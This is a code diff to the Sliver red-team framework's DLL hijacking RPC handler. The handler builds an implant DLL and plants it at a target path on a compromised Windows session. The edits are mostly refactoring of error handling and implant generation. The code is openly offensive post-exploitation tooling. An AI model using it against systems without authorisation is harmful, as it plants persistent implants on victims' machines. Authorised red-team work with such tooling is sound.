@@ -24,19 +24,24 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"io/ioutil"
+	"os"
 	"strings"
 
 	"github.com/Binject/debug/pe"
+	"google.golang.org/grpc/codes"
+	"google.golang.org/grpc/status"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/cryptography"
 	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/util/encoders"
 )
 
+// HijackDLL - RPC call to automatically perform DLL hijacking attacks
 func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*clientpb.DllHijack, error) {
 	var (
 		refDLL        []byte
@@ -47,10 +52,12 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 	}
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session == nil {
-		return resp, fmt.Errorf("could not find session %d", req.Request.SessionID)
+		return resp, ErrInvalidSessionID
 	}
-	if session.Os != "windows" {
-		return nil, fmt.Errorf("this feature is not supported on the target operating system (%s)", session.Os)
+	if session.OS != "windows" {
+		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf(
+			"this feature is not supported on the target operating system (%s)", session.OS,
+		))
 	}
 
 	// download reference DLL if we don't have one in the request
@@ -63,7 +70,9 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 			Path: req.ReferenceDLLPath,
 		})
 		if err != nil {
-			return nil, fmt.Errorf("could not download the reference DLL: %s", err)
+			return nil, status.Error(codes.InvalidArgument, fmt.Sprintf(
+				"could not download the reference DLL: %s", err.Error(),
+			))
 		}
 		if download.Encoder == "gzip" {
 			download.Data, err = new(encoders.Gzip).Decode(download.Data)
@@ -87,26 +96,34 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 			}
 		}
 		if p.GetName() == "" {
-			return nil, fmt.Errorf("no profile found for name %s", req.ProfileName)
+			return nil, status.Error(codes.InvalidArgument, fmt.Sprintf(
+				"no profile found for name %s", req.ProfileName,
+			))
 		}
 
 		if p.Config.Format != clientpb.OutputFormat_SHARED_LIB {
-			return nil, fmt.Errorf("please select a profile targeting a shared library format")
+			return nil, status.Error(codes.InvalidArgument,
+				"please select a profile targeting a shared library format",
+			)
 		}
-
 		name, config := generate.ImplantConfigFromProtobuf(p.Config)
 		if name == "" {
-			name, err = generate.GetCodename()
+			name, err = codenames.GetCodename()
 			if err != nil {
 				return nil, err
 			}
 		}
-		fPath, err := generate.SliverSharedLibrary(name, config)
+		otpSecret, _ := cryptography.TOTPServerSecret()
+		err = generate.GenerateConfig(name, config, true)
+		if err != nil {
+			return nil, err
+		}
+		fPath, err := generate.SliverSharedLibrary(name, otpSecret, config, true)
 		if err != nil {
 			return nil, err
 		}
 
-		targetDLLData, err = ioutil.ReadFile(fPath)
+		targetDLLData, err = os.ReadFile(fPath)
 		if err != nil {
 			return nil, err
 		}
@@ -134,7 +151,7 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 		Path:    req.TargetLocation,
 		Request: &commonpb.Request{
 			SessionID: session.ID,
-			Timeout:   int64(defaultTimeout),
+			Timeout:   int64(minTimeout),
 		},
 	})
 
